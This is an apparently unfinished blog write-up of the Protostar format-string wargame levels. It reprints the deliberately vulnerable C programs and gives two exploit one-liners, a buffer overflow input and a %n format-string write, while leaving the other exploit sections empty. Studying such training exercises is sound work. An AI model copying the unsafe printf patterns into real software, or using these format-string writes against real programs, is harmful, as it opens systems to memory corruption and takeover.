---
layout: post
title:  "Exploit Excersises Protostar Format"
date:   2020-1-10 0:06:00 +0000
categories: Exploit-Excersises
---
In this series ill be covering the protostar excersises from exploit-excersises / exploit.education. Its a series of challenges designed to teach common linux exploits that will occur in CTF challenges.
Protostar introduces a range of things in a way that takes it from introductory to more advanced:
- Network programming
- Byte order
- Handling sockets
- Stack overflows
- Format strings
- Heap overflows


# Format Zero
Provided Source:
{% highlight c linenos %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
{% endhighlight %}

Vulnerability

Exploit:
{% highlight bash %}
./format0 $(python -c "print 'A'*64 + '\xef\xbe\xad\xde'")
{% endhighlight %}
# Format One
Provided Source:
{% highlight c linenos %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
{% endhighlight %}

Vulnerability
Exploit:
{% highlight bash %}

{% endhighlight %}
# Format Two
Provided Source:
{% highlight c linenos %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
{% endhighlight %}
Vulnerability

Exploit:
{% highlight bash %}
$ python -c 'print "\xe4\x96\x04\x08%60d%4$n"' | ./format2
                                                         512
you have modified the target :)
{% endhighlight %}
# Format Three
Provided Source:
{% highlight c linenos %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
{% endhighlight %}
Vulnerability
Exploit:
{% highlight bash %}
{% endhighlight %}
# Format Four
Provided Source:
{% highlight c linenos %}
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
{% endhighlight %}
Vulnerability
Still the printf on line 20, but this time we need to use our overwrite capabilities to control the program flow and call the uncalled hello function. Basically like an overflow. 
Exploit:
{% highlight bash %}
{% endhighlight %}
<br>
Thats it for the format series of exercises. Next is the heap stuff.
<br>
Exploit-Exercises: 
 - [Stack](link)
 - [Format](link)
 - [Heap](link)
 - [Net](link)
 - [Final](link)


